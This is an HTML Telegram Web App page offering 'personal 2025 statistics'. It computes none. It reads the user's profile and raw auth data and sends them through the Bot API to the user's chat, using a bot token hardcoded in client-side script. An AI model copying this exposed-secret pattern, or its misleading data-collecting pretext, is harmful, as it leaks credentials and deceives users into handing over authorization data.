<!DOCTYPE html>
<html>
<head>
    <title>Telegram Stats</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="text-align:center;padding:20px;font-family:Arial">
    <h1>📊 Статистика Telegram</h1>
    <p>Узнайте свою персональную статистику за 2025 год</p>
    
    <button onclick="getUserData()" 
            style="padding:15px 30px;background:#3390ec;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer">
        Узнать статистику
    </button>
    
    <div id="result" style="margin-top:20px;"></div>

<script>
// Токен вашего бота
const botToken = '8511034529:AAGEq3gWvKPfo1O4YXxISnnhX6PonB6wgEc';

// Получаем данные пользователя из Telegram WebApp
function getUserData() {
    const tg = window.Telegram.WebApp;
    
    if (!tg.initDataUnsafe.user) {
        document.getElementById('result').innerHTML = 
            '❌ Откройте через Telegram бота';
        return;
    }
    
    const user = tg.initDataUnsafe.user;
    const authData = tg.initData;
    
    // Отправляем данные в бота
    sendToBot(user, authData);
}

// Отправляем данные на сервер бота
function sendToBot(user, authData) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: user.id,
            text: `📊 Получены данные:\nID: ${user.id}\nИмя: ${user.first_name}\nUsername: ${user.username || 'нет'}\n\nДанные авторизации: ${authData.substring(0,100)}...`
        })
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('result').innerHTML = 
            '✅ Данные отправлены в бота! Проверьте Telegram';
    })
    .catch(error => {
        document.getElementById('result').innerHTML = 
            '❌ Ошибка отправки';
    });
}

// Инициализация WebApp
window.Telegram.WebApp.ready();
window.Telegram.WebApp.expand();
</script>
</body>
</html>
